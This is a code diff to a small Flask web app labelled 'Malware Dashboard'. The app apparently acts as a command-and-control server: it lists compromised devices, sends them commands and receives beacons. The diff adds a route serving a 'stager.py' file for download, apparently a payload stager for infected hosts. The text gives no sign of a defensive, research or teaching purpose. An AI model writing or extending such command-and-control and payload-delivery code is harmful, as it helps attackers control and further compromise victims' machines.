@@ -1,4 +1,4 @@
-from flask import Flask, jsonify, request, render_template_string
+from flask import Flask, jsonify, request, render_template_string, send_file
 import json
 
 app = Flask(__name__)
@@ -10,7 +10,6 @@ devices = [
 
 commands = {}
 
-# Dashboard HTML (embedded)
 dashboard_html = '''
 <!DOCTYPE html>
 <html>
@@ -25,7 +24,6 @@ dashboard_html = '''
 <body>
     <h1>Malware Dashboard</h1>
     <div id="devices"></div>
-
     <script>
         async function fetchDevices() {
             const res = await fetch('/devices');
@@ -45,7 +43,6 @@ dashboard_html = '''
                 container.appendChild(div);
             });
         }
-
         async function sendCommand(id, cmd) {
             await fetch('/command', {
                 method: 'POST',
@@ -54,7 +51,6 @@ dashboard_html = '''
             });
             fetchDevices();
         }
-
         setInterval(fetchDevices, 5000);
         fetchDevices();
     </script>
@@ -104,6 +100,10 @@ def handle_command():
 @app.route('/beacon', methods=['GET', 'POST'])
 def beacon():
     return jsonify({'status': 'beacon received'})
+
+@app.route('/stager.py')
+def serve_stager():
+    return send_file('stager.py', mimetype='text/x-python')
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8000)
